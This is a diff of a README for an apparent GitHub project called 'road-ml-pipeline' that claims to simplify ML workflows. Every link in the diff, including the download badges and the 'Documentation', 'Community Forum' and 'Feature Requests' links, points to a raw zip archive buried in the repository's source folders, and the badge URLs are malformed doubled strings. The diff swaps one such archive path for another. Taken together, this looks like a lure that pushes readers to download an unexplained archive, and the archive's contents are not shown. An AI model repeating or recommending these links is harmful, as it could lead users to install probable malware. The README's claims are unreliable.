@@ -1,6 +1,6 @@
 # 🛣️ road-ml-pipeline - Simplify Your ML Workflow Today
 
-[![Download RoadML Pipeline](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip%https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)
+[![Download RoadML Pipeline](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip%https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)
 
 ## 📁 Overview
 
@@ -23,7 +23,7 @@ Before downloading, ensure that your system meets the following requirements:
 
 To download the software, click the button below:
 
-[![Download RoadML Pipeline](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip%https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)
+[![Download RoadML Pipeline](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip%https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)
 
 ### 3. **Download the Latest Release**
 
@@ -53,9 +53,9 @@ RoadML Pipeline includes a variety of tools designed to enhance your experience:
 
 If you want to explore more about RoadML Pipeline and machine learning, consider these resources:
 
-- [Documentation](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)
-- [Community Forum](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)
-- [Feature Requests](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/experiment/road_pipeline_ml_1.5.zip)
+- [Documentation](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)
+- [Community Forum](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)
+- [Feature Requests](https://github.com/nnamera/road-ml-pipeline/raw/refs/heads/main/mlpipeline_core/data/ml_pipeline_road_2.5.zip)
 
 ## 💬 Support
 
